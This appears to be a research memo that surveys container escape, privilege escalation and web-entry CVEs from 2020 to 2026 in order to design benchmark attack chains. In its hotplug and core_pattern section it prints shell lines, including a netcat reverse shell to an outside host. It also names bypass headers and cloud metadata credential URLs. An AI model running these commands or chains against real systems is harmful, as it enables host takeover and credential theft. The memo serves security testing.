# Container Escape & Privilege Escalation CVE Research (2020-2026)

**Generated:** 2026-06-03
**Purpose:** Identify new CVEs and attack techniques for benchmark scenarios covering container escape, privilege escalation, and web-to-container attack chains.

---

## Table of Contents

1. [Kernel Container Escape CVEs (Recommended for New Scenarios)](#1-kernel-container-escape-cves)
2. [runc / Container Runtime CVEs](#2-runc--container-runtime-cves)
3. [Docker Engine & Docker Desktop CVEs](#3-docker-engine--docker-desktop-cves)
4. [New Container Escape Techniques (2024-2026)](#4-new-container-escape-techniques-2024-2026)
5. [Web Application Entry Points for Attack Chains](#5-web-application-entry-points-for-attack-chains)
6. [Cloud-Specific Attacks](#6-cloud-specific-attacks)
7. [Existing LNX Scenarios vs New Recommendations](#7-existing-lnx-scenarios-vs-new-recommendations)
8. [Recommended New Chain Scenarios](#8-recommended-new-chain-scenarios)

---

## 1. Kernel Container Escape CVEs

### 1.1 CVE-2022-0847 — Dirty Pipe (HIGH RECOMMENDATION)

| Field | Detail |
|-------|--------|
| **CVSS** | 7.8 (High) |
| **Affected** | Linux kernel 5.8 through 5.10.101 / 5.15.24 / 5.16.10 |
| **Type** | Arbitrary file overwrite via pipe + page cache |
| **Disclosure** | March 7, 2022 |
| **PoC Public** | Yes (multiple) |
| **Container Escape** | **Yes** — two known methods |

**How it works:**
Dirty Pipe exploits the kernel's pipe mechanism to overwrite arbitrary data in any readable file (including read-only files, immutable files, and read-only mounts) by corrupting the page cache without touching the disk.

**Container escape methods:**
1. **runC binary overwrite:** Exploit `/proc/self/exe` (which points to host runC binary via magic symlink during `docker exec`). Despite CVE-2019-5736 fixes, Dirty Pipe operates at kernel level via page cache, bypassing namespace protections. An attacker overwrites the host's runC binary with malicious code.
2. **CAP_DAC_READ_SEARCH:** If container has this capability, use `open_by_handle_at()` to get FD for host files, then overwrite via Dirty Pipe.

**Docker considerations:**
- Default seccomp does NOT block `splice()` syscall needed for exploit
- `readonlyRootFilesystem: true`, `runAsNonRoot`, `allowPrivilegeEscalation: false`, Seccomp, AppArmor are all **ineffective** — operates below those layers
- Only mitigation is host kernel patching

**PoC repositories:**
- [jpts/CVE-2022-0847-DirtyPipe-Container-Breakout](https://github.com/jpts/CVE-2022-0847-DirtyPipe-Container-Breakout) — Container breakout via runC overwrite
- [greenhandatsjtu/CVE-2022-0847-Container-Escape](https://github.com/greenhandatsjtu/CVE-2022-0847-Container-Escape) — Escape via CAP_DAC_READ_SEARCH

**Chain potential:** Excellent for web→container→host chains. A web app vulnerability gives initial access, then Dirty Pipe achieves container escape.

---

### 1.2 CVE-2022-0185 — fsconfig Heap Overflow (HIGH RECOMMENDATION)

| Field | Detail |
|-------|--------|
| **CVSS** | 7.8 (High) |
| **Affected** | Linux kernel 5.1 through 5.16.2 |
| **Type** | Heap-based buffer overflow in `legacy_parse_param()` |
| **Disclosure** | January 18, 2022 |
| **PoC Public** | Yes (Crusaders of Rust) |
| **Container Escape** | Yes (Kubernetes-default) |

**How it works:**
Integer underflow in `legacy_parse_param()` allows OOB write during `fsconfig()` syscall. Exploit chain: heap overflow -> information leak via `msg_msg` objects -> spray `seq_operations` -> arbitrary R/W -> overwrite `modprobe_path` -> trigger execution.

**Docker vs Kubernetes difference:**
| Environment | Default State | Reason |
|-------------|--------------|--------|
| **Docker** | NOT vulnerable by default | Docker's default seccomp blocks `unshare()` syscall, preventing attacker from gaining CAP_SYS_ADMIN needed to call `fsconfig()` |
| **Kubernetes** | Vulnerable by default (pre-v1.22) | Kubernetes does NOT apply seccomp profiles by default |

**K8s-specific note:** From Kubernetes v1.22+, you can configure seccomp profiles, but it's not automatic. This makes CVE-2022-0185 an excellent K8s-focused scenario.

**Chain potential:** Good for K8s pod escape scenarios.

---

### 1.3 CVE-2023-0386 — OverlayFS LPE (MODERATE RECOMMENDATION)

| Field | Detail |
|-------|--------|
| **CVSS** | 7.8 (High) |
| **Affected** | Linux kernel 5.11 through 6.2 |
| **Type** | Improper ownership management in OverlayFS copy-up |
| **Disclosure** | March 2023 |
| **PoC Public** | Yes |
| **Container Escape** | Limited (requires CAP_SYS_ADMIN) |

**How it works:**
During OverlayFS copy-up operation, kernel fails to check whether file owner UID/GID is properly mapped in the current user namespace. An unprivileged user can smuggle a SUID binary from `nosuid` lower layer to upper layer without stripping privileged attributes.

**Container escape limitation:**
- Standard Docker containers drop CAP_SYS_ADMIN by default, preventing OverlayFS mounts inside the container
- Only works with `CAP_SYS_ADMIN` + user namespace + unpatched kernel

**CISA KEV:** Added June 2025 (actively exploited in the wild)

**PoC:** [dragosbanica/CVE-2023-0386_POC](https://github.com/dragosbanica/CVE-2023-0386_POC)

---

### 1.4 CVE-2023-2640 / CVE-2023-32629 — GameOver(lay) (MODERATE RECOMMENDATION)

| Field | Detail |
|-------|--------|
| **CVSS** | 7.8 (High) |
| **Affected** | Ubuntu-specific kernels (5.19, 6.2 on Lunar/Kinetic/Jammy) |
| **Type** | OverlayFS extended attribute escape |
| **Disclosure** | July 2023 |
| **PoC Public** | Yes (one-liner available) |
| **Container Escape** | Yes (non-root containers + hostPath volume) |

**Ubuntu-specific.** These CVEs arise from Ubuntu's custom kernel patches from 2018. Only affects Ubuntu kernels.

**Container escape path (CrowdStrike research):**
1. Non-root **privileged** container with writable **hostPath volume mount** (e.g., `/tmp`)
2. Create OverlayFS on the hostPath volume (outside container layer) -> escape succeeds
3. Once root inside container, use standard escape techniques for host compromise

**Requirements:** `privileged: true`, `runAsNonRoot: true`, hostPath volume, no seccomp/AppArmor.

**PoC:** [pirenga/CVE-2023-2640-CVE-2023-32629](https://github.com/pirenga/CVE-2023-2640-CVE-2023-32629)

---

### 1.5 CVE-2023-4911 — Looney Tunables (glibc) (MODERATE RECOMMENDATION)

| Field | Detail |
|-------|--------|
| **CVSS** | 7.8 (High) |
| **Affected** | glibc 2.34+ (most Linux distros 2021-2023) |
| **Type** | Buffer overflow in `ld.so` GLIBC_TUNABLES parsing |
| **Disclosure** | October 3, 2023 |
| **PoC Public** | Yes (Metasploit module, multiple GitHub PoCs) |
| **Container Escape** | Yes (works from inside containers) |

**How it works:**
Buffer overflow in `parse_tunables()` when processing crafted `GLIBC_TUNABLES` environment variable. Exploit: overflow mmap'd region -> overwrite `l_info[DT_RPATH]` pointer -> load malicious libc -> root.

**Container relevance:**
- Vulnerable SUID binaries exist in container images (e.g., `/usr/bin/su`)
- Affects glibc-based container images (not Alpine/musl)
- Kinsing cryptojacking group actively exploited this in AWS environments

**Kernel vs glibc:** This is not a kernel vulnerability — it's in userspace (glibc). However, it provides root inside the container, which can then chain into escape techniques.

**PoC:**
- [KillReal01/CVE-2023-4911](https://github.com/KillReal01/CVE-2023-4911)
- [ruycr4ft/CVE-2023-4911](https://github.com/ruycr4ft/CVE-2023-4911)
- Metasploit: `linux/local/glibc_tunables_priv_esc`

---

### 1.6 CVE-2022-0492 — cgroup v1 release_agent (HIGH RECOMMENDATION)

| Field | Detail |
|-------|--------|
| **CVSS** | 7.0 (High) |
| **Affected** | Linux kernel before 5.17-rc3 |
| **Type** | Improper permission check in cgroup v1 `release_agent` |
| **Disclosure** | February 4, 2022 |
| **PoC Public** | Yes |
| **Container Escape** | Yes (classic technique) |

**How it works:**
The cgroup v1 `release_agent` file executes a binary as root when a cgroup process terminates. Kernel did not verify namespace crossing permissions. Exploit: create user namespace -> mount cgroupfs -> set `release_agent` -> trigger process exit -> kernel executes payload as host root.

**Requirements:** Root inside container + CAP_SYS_ADMIN + cgroup v1 + AppArmor/SELinux/seccomp all disabled or lenient.

**NOTE:** cgroup v1 is being phased out. Modern Linux (2024+) defaults to cgroup v2, which does NOT have `release_agent`. However, many older systems and Docker installations still use cgroup v1.

**Relationship to K8S-14:** If K8S-14 is a cgroup release_agent escape, CVE-2022-0492 is the canonical "permission check bypass" variant. The generic cgroup escape technique (without CVE) has been known since at least 2019.

**PoC:** [T1erno/CVE-2022-0492-Docker-Breakout-Checker-and-PoC](https://github.com/T1erno/CVE-2022-0492-Docker-Breakout-Checker-and-PoC)
**Metasploit:** `exploit/linux/local/docker_cgroup_escape`

---

### 1.7 CVE-2026-31431 — "Copy Fail"AF_ALG (HIGHEST RECOMMENDATION)

| Field | Detail |
|-------|--------|
| **CVSS** | 7.8 (High) |
| **Affected** | Linux kernel ~4.11 through 6.17.x |
| **Type** | Page-cache corruption via `algif_aead` in-place encryption |
| **Disclosure** | April 29, 2026 |
| **PoC Public** | Yes (732-byte Python script) |
| **Container Escape** | Yes (confirmed by Docker, works in default containers) |

**The most impactful recent discovery.** Affects virtually every Linux system from 2017 to mid-2026.

**How it works:**
1. AF_ALG socket + `splice()` transfers page-cache pages into crypto scatterlist by reference
2. `authencesn` scratch write writes 4 attacker-controlled bytes into page-cache pages (past auth tag)
3. Corrupted page is never marked dirty — on-disk file unchanged, but in-memory page cache modified
4. Execute SUID binary (e.g., `/usr/bin/su`) -> shellcode runs with root

**Container escape:**
- Default Docker seccomp allows AF_ALG socket creation
- Page cache is shared system-wide — container can corrupt host binary's page cache
- OverlayFS provides partial isolation (lower layer files shared between containers on same host)
- Docker Engine v29.4.3 blocks AF_ALG via seccomp as mitigation

**Key advantages over Dirty COW / Dirty Pipe:**
- **No race condition** — single-threaded, deterministic (100% success)
- **No kernel-specific offsets** — works across distributions without recompilation
- **No special capabilities required** — works in default Docker containers

**PoC repositories (multiple languages):**
- [xeloxa/copyfail-exploit](https://github.com/xeloxa/copyfail-exploit) (Python)
- [Gr-1m/CVE-2026-31431](https://github.com/Gr-1m/CVE-2026-31431) (Golang)
- [luotian2/CVE-2026-31431](https://github.com/luotian2/CVE-2026-31431) (C)
- [JimmyPughtron/CVE-2026-31431-Copy-Fail---Minified-LPE-PoC](https://github.com/JimmyPughtron/CVE-2026-31431-Copy-Fail---Minified-LPE-PoC) (18-line Python, targets /etc/passwd)

---

### 1.8 CVE-2026-43284 / CVE-2026-43500 — "Dirty Frag"(HIGHEST RECOMMENDATION)

| Field | Detail |
|-------|--------|
| **CVSS** | High |
| **Affected** | Linux kernels before commit `f4c50a4034e6` |
| **Type** | Page-cache corruption in `xfrm/ESP` receive path |
| **Disclosure** | 2026 |
| **PoC Public** | Yes (V4bel) |
| **Container Escape** | Yes (Kubernetes PoC validated on EKS) |

**How it works:**
4-byte write primitive via `splice()` in xfrm/ESP (IPsec) receive path. Related to Copy Fail mechanism but in a different kernel subsystem.

**Kubernetes escape PoC** validated on Amazon EKS (kernel 6.12.80):
1. Unprivileged pod -> corrupt page-cache of binary in shared image layer
2. Privileged DaemonSet (e.g., kube-proxy) executes corrupted binary -> host root

**Requires:** User namespaces + CAP_NET_ADMIN in new netns (blocks GKE/ACK with default configs)

**Microsoft confirmed active exploitation** as of May 2026.

**PoC:** [V4bel/dirtyfrag](https://github.com/V4bel/dirtyfrag)
**K8s PoC:** [Percivalll/Dirty-Frag-Kubernetes-PoC](https://github.com/Percivalll/Dirty-Frag-Kubernetes-PoC)

---

## 2. runC / Container Runtime CVEs

### 2.1 CVE-2024-21626 — Leaky Vessels (ALREADY COVERED)

Already covered in existing K8s scenarios. runC file descriptor leak -> container escape via WORKDIR manipulation.

### 2.2 CVE-2025-31133 — runC MaskedPath Race (HIGH RECOMMENDATION)

| Field | Detail |
|-------|--------|
| **CVSS** | 7.3 (High) |
| **Affected** | All runC versions before 1.2.8 |
| **Type** | Race condition on /dev/null bind-mount during maskedPaths enforcement |
| **Disclosure** | November 2025 |
| **PoC Public** | Yes |
| **Container Escape** | Yes |

**How it works:**
runc fails to verify that `/dev/null` is legitimate during masked paths setup. Attacker swaps it with a symlink -> runc bind-mounts arbitrary host paths -> e.g., write to `/proc/sys/kernel/core_pattern` -> coredump helper execution as host root.

**PoC:** [scherepiuk/container-escape-ebpf](https://github.com/scherepiuk/container-escape-ebpf)

### 2.3 CVE-2025-52565 — runC /dev/console Mount Race (MODERATE RECOMMENDATION)

| Field | Detail |
|-------|--------|
| **CVSS** | High |
| **Affected** | runC 1.0.0-rc3 through 1.2.7 |
| **Type** | Mount race condition on /dev/console |
| **Disclosure** | November 2025 |
| **PoC Public** | Confirmed (Alibaba Cloud: "public") |
| **Container Escape** | Yes |

**How it works:**
The `/dev/console` bind-mount occurs before maskedPaths/readonlyPaths protection is applied. Race allows attacker to redirect mount to gain write access to protected procfs files.

### 2.4 CVE-2025-52881 — runC LSM Bypass (MODERATE RECOMMENDATION)

| Field | Detail |
|-------|--------|
| **CVSS** | High |
| **Affected** | All known runC versions before 1.2.8 |
| **Type** | LSM (AppArmor/SELinux) bypass via shared mount race |
| **Disclosure** | November 2025 |
| **PoC Public** | Not confirmed |
| **Container Escape** | Yes |

**How it works:**
Redirect runC writes to fake procfs files -> manipulate `/proc/sysrq-trigger` or `/proc/sys/kernel/core_pattern` -> host compromise.

---

## 3. Docker Engine & Docker Desktop CVEs

### 3.1 CVE-2025-9074 — Docker Desktop Unauthenticated Engine API (HIGH RECOMMENDATION)

| Field | Detail |
|-------|--------|
| **CVSS** | 9.3 (Critical) |
| **Affected** | Docker Desktop < 4.44.3 on Windows & macOS |
| **Type** | Unauthenticated Docker Engine API exposed to containers |
| **Disclosure** | August 2025 |
| **PoC Public** | Yes |
| **Container Escape** | Yes |

**How it works:**
Docker Engine API exposed on `http://192.168.65.7:2375` **without authentication** from any container. Attacker creates privileged containers, mounts host filesystem, achieves full host takeover.

**Linux NOT affected** (uses Unix sockets). But this is a great scenario for Docker Desktop-focused chains.

**PoC:** [PtechAmanja/CVE-2025-9074-Docker-Desktop-Container-Escape](https://github.com/PtechAmanja/CVE-2025-9074-Docker-Desktop-Container-Escape)

### 3.2 CVE-2026-34040 — Docker AuthZ Plugin Bypass (HIGH RECOMMENDATION)

| Field | Detail |
|-------|--------|
| **CVSS** | 8.8 (High) |
| **Affected** | Docker Engine < 29.3.1 |
| **Type** | Authorization plugin bypass via HTTP body truncation |
| **Disclosure** | April 2026 |
| **PoC Public** | Yes (Cyera Research) |
| **Container Escape** | Yes |

**How it works:**
HTTP request body >1MB is truncated before being sent to AuthZ plugins (OPA, Prisma Cloud, etc.), but the daemon executes the full original request. Attacker pads first MB and places `"Privileged": true` at the end -> plugin sees safe request -> daemon creates privileged container.

**Impact:** Full host-level root access via privileged container mounting `/`.

**Actively exploited in the wild** as of 2026.

### 3.3 CVE-2024-23650 / CVE-2024-23651 — BuildKit Vulnerabilities

| Field | Detail |
|-------|--------|
| **CVSS** | 9.8 (Critical) for 23650 |
| **Affected** | BuildKit < 0.12.5 |
| **Type** | Race condition in parallel build steps with shared cache mounts |
| **Disclosure** | January 2024 |

**CVE-2024-23651:** Race condition in parallel build steps can expose host filesystem to build container. Good for CI/CD pipeline escape scenarios.

### 3.4 Docker Extensions RCE (CVE-2023-0626, CVE-2024-8695)

Multiple RCE vulnerabilities via malicious Docker Extensions (CVSS 9.8). Docker Extensions are a persistent attack surface.

---

## 4. New Container Escape Techniques (2024-2026)

### 4.1 hotplug and core_pattern Hijack (cgroup v2 era)

As cgroup v2 replaces v1, the classic `release_agent` escape no longer works. Attackers have pivoted:

**hotplug hijack:**
```bash
echo "/path/to/payload" > /proc/sys/kernel/hotplug
ip link add test0 type dummy  # triggers hotplug event
```

**core_pattern hijack:**
```bash
echo "|/usr/bin/nc -e /bin/sh <IP> <PORT>" > /proc/sys/kernel/core_pattern
kill -SIGABRT <PID>  # triggers core dump -> payload execution
```

Both require CAP_SYS_ADMIN / privileged container. Both work on cgroup v2 systems.

### 4.2 Page-Cache Corruption Attacks (2026 Breakthrough)

Two major discoveries in 2026 fundamentally changed the container escape landscape:
- **CVE-2026-31431 (Copy Fail)** — AF_ALG page-cache corruption
- **CVE-2026-43284 (Dirty Frag)** — xfrm/ESP page-cache corruption

These are **kernel-level attacks that bypass container isolation at the page-cache layer**. They work from default unprivileged containers and require no capabilities.

### 4.3 Chained Container-to-Cluster Attacks (IEEE 2025)

Research paper "From Container to Cluster" demonstrates full lifecycle:
1. eBPF-based kernel vulnerability -> initial escape
2. Lateral movement via misconfigured service account tokens & shared persistent volumes
3. Full cluster takeover

### 4.4 NVIDIA Container Toolkit Escape (CVE-2025-23266)

37% of cloud environments with AI workloads vulnerable. A 3-line Dockerfile grants full root access to the Kubernetes node. Bypasses gVisor because exploit occurs during container initialization (before syscall filtering activates).

---

## 5. Web Application Entry Points for Attack Chains

These are web application CVEs with public PoCs that could serve as the initial entry point in a multi-step attack chain (web app -> container escape -> host/higher privileges):

### 5.1 CVE-2025-24813 — Apache Tomcat Partial PUT RCE (HIGH PRIORITY)

| Field | Detail |
|-------|--------|
| **CVSS** | 9.8 (Critical) |
| **Affected** | Tomcat 9.0.0-M1 through 9.0.98, 10.1.0-M1 through 10.1.34, 11.0.0-M1 through 11.0.2 |
| **Type** | Partial PUT + file-based session deserialization -> RCE |
| **Disclosure** | March 10, 2025 |
| **PoC Public** | Yes (many GitHub repos) |
| **Container relevance** | Tomcat commonly runs in Docker containers |

**How it works:**
1. PUT request with base64-encoded serialized Java payload
2. Payload saved as `.session` file via path traversal
3. GET request with JSESSIONID cookie pointing to uploaded session file
4. Tomcat deserializes the file -> arbitrary code execution

**Pre-requisites:** Writes enabled for default servlet, partial PUT support, file-based session persistence.

**PoC repos (50+ available):**
- [Shivshantp/CVE-2025-24813](https://github.com/Shivshantp/CVE-2025-24813)
- [fatkz/CVE-2025-24813](https://github.com/fatkz/CVE-2025-24813)

**Note:** You already have Tomcat deserialization (WEB-01) and race condition (WEB-02) scenarios. This is a different Tomcat vulnerability.

### 5.2 CVE-2024-23897 — Jenkins Arbitrary File Read -> RCE (HIGH PRIORITY)

| Field | Detail |
|-------|--------|
| **CVSS** | 9.8 (Critical) |
| **Affected** | Jenkins <= 2.441, LTS <= 2.426.2 |
| **Type** | CLI `@` file read -> credential decryption -> RCE |
| **Disclosure** | January 2024 |
| **PoC Public** | Yes |
| **Container relevance** | Jenkins often runs in Docker containers |

**Attack chain:**
1. Unauthenticated file read via `@/etc/passwd` CLI argument
2. (If authenticated) Read secrets -> decrypt credentials -> RCE via Script Console
3. Container entry point -> escape via privileged access

**PoC:** [10T4/PoC-Fix-jenkins-rce_CVE-2024-23897](https://github.com/10T4/PoC-Fix-jenkins-rce_CVE-2024-23897)

### 5.3 CVE-2024-36401 — GeoServer RCE (HIGH PRIORITY)

| Field | Detail |
|-------|--------|
| **CVSS** | 9.8 (Critical) |
| **Affected** | GeoServer < 2.22.6, 2.23.6, 2.24.4, 2.25.2 |
| **Type** | Unsafe XPath evaluation -> pre-auth RCE |
| **Disclosure** | July 1, 2024 |
| **PoC Public** | Yes |
| **Container relevance** | GeoServer commonly deployed in Docker |

**How it works:**
GeoServer evaluates property names as XPath expressions via `commons-jxpath`. Unauthenticated requests to WFS/WMS/WPS endpoints with crafted `valueReference` parameter trigger code execution.

**PoC:** [NtksCnZV/CVE-2024-36401-Poc](https://github.com/NtksCnZV/CVE-2024-36401-Poc)

### 5.4 CVE-2024-27198 — JetBrains TeamCity Auth Bypass (MODERATE PRIORITY)

| Field | Detail |
|-------|--------|
| **CVSS** | 9.8 (Critical) |
| **Affected** | TeamCity < 2023.11.4 |
| **Type** | Authentication bypass -> admin access -> RCE |
| **Disclosure** | March 4, 2024 |
| **PoC Public** | Yes |

**Attack chain:** Bypass auth -> create admin user -> upload malicious plugin -> RCE in container -> escape.

### 5.5 CVE-2025-29927 — Next.js Middleware Auth Bypass (MODERATE PRIORITY)

| Field | Detail |
|-------|--------|
| **CVSS** | 9.1 (Critical) |
| **Affected** | Next.js 11.x through 15.2.2 (all modern) |
| **Type** | Authorization bypass via forged `x-middleware-subrequest` header |
| **Disclosure** | March 2025 |
| **PoC Public** | Yes |
| **Container relevance** | Next.js commonly deployed in Docker |

**How it works:**
Simply sending `x-middleware-subrequest: middleware` HTTP header bypasses all middleware-based auth. Can chain with admin panel features for RCE.

**PoC:** [DanielHallbro/CVE-2025-29927-Nextjs-Bypass-PoC](https://github.com/DanielHallbro/CVE-2025-29927-Nextjs-Bypass-PoC)

### 5.6 CVE-2024-24304 — SiYuan ZipSlip (MODERATE PRIORITY)

| Field | Detail |
|-------|--------|
| **CVSS** | Critical |
| **Affected** | SiYuan <= 2.10.4 |
| **Type** | ZipSlip path traversal -> overwrite entrpoint.sh |
| **Disclosure** | 2024 |
| **PoC Public** | Yes |

**Container-specific:** Overwrites container's `entrypoint.sh` via ZIP upload. On restart, payload executes. Direct Docker container compromise.

### 5.7 CVE-2024-6387 — OpenSSH regreSSHion (LOWER PRIORITY)

| Field | Detail |
|-------|--------|
| **CVSS** | 8.1 (High) |
| **Affected** | OpenSSH 8.5p1 through 9.8p1 |
| **Type** | Signal handler race condition -> RCE as root |
| **Disclosure** | July 2024 |
| **PoC Public** | Yes (32-bit only currently) |

**Limitation:** All public PoCs only work on 32-bit systems. 64-bit exploitation is significantly harder. However, it's a great scenario if targeting 32-bit container images.

### 5.8 CVE-2024-9264 — Grafana DuckDB RCE (LOWER PRIORITY)

| Field | Detail |
|-------|--------|
| **CVSS** | 9.9 (Critical) |
| **Affected** | Grafana 11.0.0 through 11.2.1 |
| **Type** | SQL Expression RCE (requires authentication + DuckDB binary) |
| **Disclosure** | 2024 |
| **PoC Public** | Yes |

**Limitation:** Requires DuckDB binary in Grafana's PATH (not shipped by default). But still a good scenario for authenticated RCE.

---

## 6. Cloud-Specific Attacks

### 6.1 AWS IMDS (Instance Metadata Service) Abuse

| Attack | Description |
|--------|-------------|
| **IMDSv1 SSRF** | Classic: SSRF -> http://169.254.169.254/latest/meta-data/ -> IAM credentials |
| **IMDSv2 mitigation** | Requires PUT token, but still bypassable in certain configurations |
| **Container escape via IMDS** | SSRF from container -> AWS metadata -> IAM keys -> cloud lateral movement |

Good chain: Web application SSRF -> IMDS -> IAM credentials -> S3/EC2 access.

### 6.2 K8s Service Account Token Abuse

Default auto-mount of service account tokens in Kubernetes pods. Weak RBAC allows:
- Listing secrets across namespaces
- Creating privileged pods
- Accessing cloud metadata services

This is the foundation of many existing chains (sa-lateral-escape, privilege-to-etcd, etc.).

### 6.3 GCP Metadata Attack

`http://metadata.google.internal/computeMetadata/v1/` accessible from GKE nodes.
SSRF from container -> access token for GCP service accounts -> cloud lateral movement.

### 6.4 Azure IMDS Attack

`http://169.254.169.254/metadata/identity/oauth2/token` accessible from Azure VMs.
Similar to AWS IMDS but with different endpoint paths and authentication.

---

## 7. Existing LNX Scenarios vs New Recommendations

### Current LNX Scenarios:
| ID | CVE | Target | Type |
|----|-----|--------|------|
| LNX-01 | CVE-2024-1086 | nftables UAF | Kernel LPE |
| LNX-02 | CVE-2024-26809 | nftables pipapo | Kernel LPE |
| LNX-03 | CVE-2024-50264 | kernel cgroup | Kernel LPE |
| LNX-04 | CVE-2025-21756 | vsock UAF | Kernel LPE |
| LNX-05 | CVE-2025-32463 | sudo chroot | Userspace LPE |

### Recommended New LNX Scenarios (Priority Order):

| Priority | CVE | Name | Reason |
|----------|-----|------|--------|
| **P0** | CVE-2026-31431 | Copy Fail (AF_ALG) | Most impactful: works in default containers, deterministic, 2017-2026 kernels, public PoC in multiple languages |
| **P0** | CVE-2026-43284 | Dirty Frag (xfrm/ESP) | Same page-cache corruption class, K8s PoC validated on EKS, active exploitation |
| **P1** | CVE-2022-0847 | Dirty Pipe | Classic, well-understood, container breakout PoC exists, Docker seccomp doesn't block splice() |
| **P1** | CVE-2022-0185 | fsconfig | Kubernetes-specific (works by default in K8s), public PoC |
| **P1** | CVE-2022-0492 | cgroup v1 release_agent | Classic technique, well-documented, Metasploit module available |
| **P2** | CVE-2023-0386 | OverlayFS LPE | CISA KEV (actively exploited June 2025), but requires CAP_SYS_ADMIN |
| **P2** | CVE-2023-2640/32629 | GameOver(lay) | Ubuntu-specific, container escape via hostPath volume |
| **P2** | CVE-2023-4911 | Looney Tunables (glibc) | Userspace LPE, but container images affected, public PoC |
| **P2** | CVE-2025-31133 | runC maskedPath race | Recent (Nov 2025), runC level, public PoC |

---

## 8. Recommended New Chain Scenarios

### Chain 1: Web App -> Container Escape -> Host (Tomcat + Dirty Pipe)
- **Entry:** CVE-2025-24813 (Tomcat Partial PUT RCE) -> container access
- **Escape:** CVE-2022-0847 (Dirty Pipe container breakout via runC overwrite)
- **Target:** Host root flag

### Chain 2: Jenkins -> K8s Pod -> Cluster Admin
- **Entry:** CVE-2024-23897 (Jenkins file read -> RCE) -> pod access
- **Escape:** CVE-2026-31431 (Copy Fail) -> host root on K8s node
- **Lateral:** Service account token abuse -> cluster admin

### Chain 3: GeoServer -> Container -> Cloud Metadata
- **Entry:** CVE-2024-36401 (GeoServer pre-auth RCE) -> container access
- **Escape:** CVE-2026-43284 (Dirty Frag) -> host root
- **Lateral:** IMDS/metadata service -> cloud IAM credentials

### Chain 4: Grafana -> Weak K8s Config -> Cluster Admin
- **Entry:** CVE-2024-9264 (Grafana DuckDB RCE) -> container access
- **Escape:** CVE-2022-0185 (fsconfig, K8s-default vulnerable) -> host root on K8s node
- **Lateral:** etcd access via kubelet -> cluster compromise

### Chain 5: WordPress -> Cgroup -> Host
- **Entry:** WordPress plugin RCE -> container (web server) access
- **Escape:** CVE-2022-0492 (cgroup v1 release_agent) -> host root
- **Note:** Requires cgroup v1 system

### Chain 6: SSH (XZ Backdoor) -> Container Escape -> Host
- **Entry:** CVE-2024-3094 (XZ backdoor in SSH -> pre-auth RCE) -> container root
- **Escape:** CVE-2025-31133 (runc maskedPath race) -> host root
- **Note:** Requires XZ backdoored image + systemd for sshd

### Chain 7: Web App -> Docker AuthZ Bypass -> Host
- **Entry:** Any web app RCE -> initial container access
- **Escape:** CVE-2026-34040 (Docker Engine AuthZ bypass -> privileged container -> host)
- **Note:** Requires Docker Engine with AuthZ plugins configured (OPA, etc.)

---

## Summary of Most Impactful Findings

### Top 3 for Immediate New Scenarios:

1. **CVE-2026-31431 (Copy Fail)** — Page-cache corruption via AF_ALG. Works from default unprivileged containers, no race condition, 100% success rate, affects all kernels from 2017-2026. Public PoC in Python, Go, C. Docker itself acknowledged this and released mitigation in v29.4.3.

2. **CVE-2022-0847 (Dirty Pipe)** — The classic container escape via kernel page-cache. Container breakout PoC exists, Docker seccomp doesn't block the required splice() syscall, well-documented and reliable.

3. **CVE-2022-0185 (fsconfig)** — Kubernetes-focused. Works by default in K8s (no seccomp profile applied) but NOT in default Docker. Great for K8s-specific chain scenarios.

### Top 3 Web App Entry Points:

1. **CVE-2025-24813** — Tomcat Partial PUT RCE. Directly exploitable, 50+ PoCs on GitHub. Already have Tomcat scenarios but this is a different vulnerability.

2. **CVE-2024-36401** — GeoServer pre-auth RCE. No authentication needed, widely deployed in Docker, actively exploited.

3. **CVE-2024-23897** — Jenkins RCE. CI/CD servers are high-value targets, well-understood exploit chain, Docker-based PoC available.
